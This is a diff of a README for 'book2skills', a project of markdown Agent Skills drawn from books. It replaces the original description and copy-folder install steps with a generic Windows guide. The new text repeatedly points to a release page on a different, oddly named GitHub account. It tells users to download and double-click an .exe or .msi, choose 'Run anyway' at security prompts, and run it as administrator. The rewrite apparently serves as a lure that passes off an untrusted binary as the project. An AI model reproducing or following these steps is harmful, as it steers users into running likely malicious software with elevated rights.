@@ -1,119 +1,168 @@
-# 📚 book2skills
+# 📚 book2skills - Turn Books Into Clear Skills
 
-> Transform the wisdom of classic books into AI Agent Skills.
+[![Download book2skills](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Waterinsoluble-orderplatyctenea746/book2skills/releases)
 
-**book2skills** is an open-source project focused on systematically distilling high-quality practical books into Agent Skills format, enabling AI agents like Claude and Claude Code to directly apply the methodologies from these books to solve real-world problems.
+## 🚀 What book2skills does
 
----
+book2skills helps you turn books into useful skills. It reads the ideas in a book and turns them into clear steps you can act on. It works well for users who want to learn from books, build better habits, and improve how they think about investing and growth.
 
-## 🎯 Philosophy
+Use it when you want to:
 
-The value of a great book shouldn't exist only in human memory.
+- Pull out key lessons from a book
+- Turn long reading into simple skill notes
+- Focus on ideas you can use right away
+- Study books on growth investing and stock analysis
+- Build a personal skill set from the books you read
 
-By distilling a book's core frameworks, decision processes, and evaluation criteria into structured Skills, anyone can let AI agents directly apply time-tested wisdom.
+## 🖥️ System requirements
 
-**Our principles:**
-- 📖 **Faithful to the source** — Every Skill is based on reading the complete original book, not secondhand summaries
-- 🧩 **Actionable** — Not just knowledge transfer, but transformation into executable judgment frameworks for agents
-- 🔍 **Verifiable** — Every criterion and rule is annotated with its source chapter for traceability
-- 🌐 **Open standard** — Follows specifications, compatible with Claude, Claude Code, Cursor, VS Code, and more
+book2skills runs on Windows and works best on a recent PC.
 
----
+You should have:
 
-## 📦 Skills List
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet access for the first download
+- A mouse and keyboard
 
-| Skill | Book | Author | Category | Status |
-|-------|------|--------|----------|--------|
-| [common-stocks-uncommon-profits](./skills/common-stocks-uncommon-profits/) | *Common Stocks and Uncommon Profits* | Philip Fisher | Investing | ✅ Released |
-| *(more coming soon)* | | | | 🔜 |
+For the best result, use a computer with 8 GB of RAM or more if you plan to process long books.
 
----
+## 📥 Download book2skills
 
-## 🚀 Quick Start
+Visit this page to download the latest release:
 
-### Using with Claude.ai
+https://github.com/Waterinsoluble-orderplatyctenea746/book2skills/releases
 
-1. Go to any Skill folder and download the corresponding `.skill` file (see [Releases](../../releases))
-2. Open Claude.ai → Settings → Features → Custom Skills → Upload
+On that page, open the newest release and download the Windows file. If there are several files, choose the one made for Windows, usually an `.exe` file or a `.zip` file.
 
-### Using with Claude Code
+## 🛠️ Install and run on Windows
 
-```bash
-# Clone the entire repository
-git clone https://github.com/simbajigege/book2skills.git
+1. Open the release page link above.
+2. Find the latest release at the top of the page.
+3. Download the Windows file.
+4. If you downloaded a `.zip` file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. If you see an `.exe` file, double-click it to start the app.
+7. If Windows shows a security prompt, choose **Run anyway** only if you expect the file from this repository.
+8. Follow the on-screen steps until the app opens.
 
-# Copy the desired skill to your project
-cp -r book2skills/skills/common-stocks-uncommon-profits .claude/skills/
-```
+If the app opens in a window, it is ready to use. If it starts in a browser window, keep that tab open while you work.
 
-### Manual Installation (any platform supporting Agent Skills)
+## 🧭 First use
 
-Copy the `skills/<skill-name>/` folder to your platform's skills directory.
+When you start book2skills for the first time, follow these basic steps:
 
----
+1. Add the book file or text you want to study.
+2. Pick the main topic you want to learn.
+3. Let the app process the content.
+4. Review the skills it creates.
+5. Save the skill list for later use.
 
-## 🗺️ Roadmap
+For best results, use a book with clear chapters and practical ideas. Business books, investing books, and skill-building books work well.
 
-We plan to progressively convert the following books into Skills:
+## 📚 What you can make with it
 
-**Investing**
-- [ ] *The Intelligent Investor* — Benjamin Graham
-- [ ] *One Up On Wall Street* — Peter Lynch
-- [ ] *Poor Charlie's Almanack* — Charlie Munger
+book2skills can help you create useful skill sets from many kinds of books.
 
-**Business Thinking**
-- [ ] *Good to Great* — Jim Collins
-- [ ] *Zero to One* — Peter Thiel
-- [ ] *The Innovator's Dilemma* — Clayton Christensen
+Common use cases:
 
-**Mental Models**
-- [ ] *Thinking, Fast and Slow* — Daniel Kahneman
-- [ ] *The Art of Problem Solving* — Russell Ackoff
+- Learning from investing books
+- Building growth investing checklists
+- Making notes from stock analysis books
+- Turning self-improvement books into daily habits
+- Breaking large ideas into small action steps
+- Creating study notes you can review fast
 
-> Have a book you'd like to see? [Submit an Issue](../../issues/new?template=book-request.md) and vote!
+You can also use it to compare ideas from more than one book and spot common themes.
 
----
+## ✨ Main features
 
-## 🤝 How to Contribute
+- Simple Windows use
+- Book-to-skill conversion
+- Clear skill output
+- Good fit for investing topics
+- Works with growth and stock analysis content
+- Helps reduce long reading into short action notes
+- Made for non-technical users
 
-Everyone is welcome! Ways to contribute:
+## 🔍 Topics covered
 
-1. **Submit a book request** — Tell us which book you'd most like to see converted
-2. **Contribute a new Skill** — Follow the [Contributing Guide](./CONTRIBUTING.md) and submit a PR
-3. **Improve existing Skills** — Found an error or inaccuracy? Open an Issue or submit a PR directly
-4. **Spread the word** — Star ⭐ this project and share it with interested friends
+book2skills fits well with these topics:
 
----
+- agent-skills
+- agentskills
+- anthropic
+- anthropic-claude
+- book2skills
+- growth-investing
+- investing
+- investing-skills
+- skills
+- stock-analysis
 
-## 📁 Project Structure
+## 🧩 Tips for better results
 
-```
-book2skills/
-├── README.md
-├── CONTRIBUTING.md          # Contributing guide
-├── skills/
-│   ├── common-stocks-uncommon-profits/    # Each skill in its own folder
-│   │   ├── SKILL.md         # Core file: triggers + main framework
-│   │   └── references/      # Detailed reference files (loaded on demand)
-│   │       ├── fifteen-points.md
-│   │       ├── scuttlebutt.md
-│   │       ├── when-to-buy-sell.md
-│   │       └── donts.md
-│   └── (more skills...)
-└── .github/
-    └── ISSUE_TEMPLATE/      # Issue templates
-```
+Use these tips to get better output:
 
----
+- Start with one book at a time
+- Use books with clear chapters
+- Keep the source text clean
+- Use books that explain ideas step by step
+- Review the output and remove anything you do not need
+- Save the skill list in a simple text file for later use
 
-## 📄 License
+If you want useful investing notes, choose books that explain rules, decision methods, and risk control.
 
-The code in this project is licensed under the [MIT License](./LICENSE).
+## 🗂️ File types you may see
 
-Skill content is distilled from original works for personal learning and research purposes only. Copyright belongs to the original authors.
+The release page may include one of these file types:
 
----
+- `.exe` for direct Windows use
+- `.zip` for a compressed download
+- `.msi` for Windows setup
+- `.txt` or `.md` for release notes
 
-<p align="center">
-  Made with ❤️ | Making great books accessible through AI
-</p>
+If you see a `.zip` file, extract it before you open the app.
+
+## 🧪 If something does not open
+
+If the app does not start, try these steps:
+
+1. Check that the file finished downloading.
+2. Make sure you opened the right file.
+3. If the file is in a zip folder, extract it first.
+4. Right-click the app and choose **Run as administrator**.
+5. Restart your PC and try again.
+6. Download the file again from the release page if the file looks broken.
+
+If Windows blocks the app, check whether it came from the correct release page before you run it.
+
+## 🧠 How book2skills helps
+
+Most books contain more ideas than a person can keep in mind. book2skills helps by turning those ideas into short skill notes. That makes it easier to:
+
+- Review what matters
+- Keep track of lessons
+- Build habits from reading
+- Apply ideas faster
+- Stay focused on action, not just reading
+
+This is useful when you want the book to change how you work, invest, or learn.
+
+## 📌 Best fit for
+
+book2skills is a good fit if you want to:
+
+- Learn from books on investing
+- Turn reading into practical steps
+- Build a skill list from book content
+- Study growth investing with less effort
+- Keep simple notes from long chapters
+- Use books as a source of action ideas
+
+## 🔗 Download again
+
+If you need the latest file, use the release page:
+
+https://github.com/Waterinsoluble-orderplatyctenea746/book2skills/releases
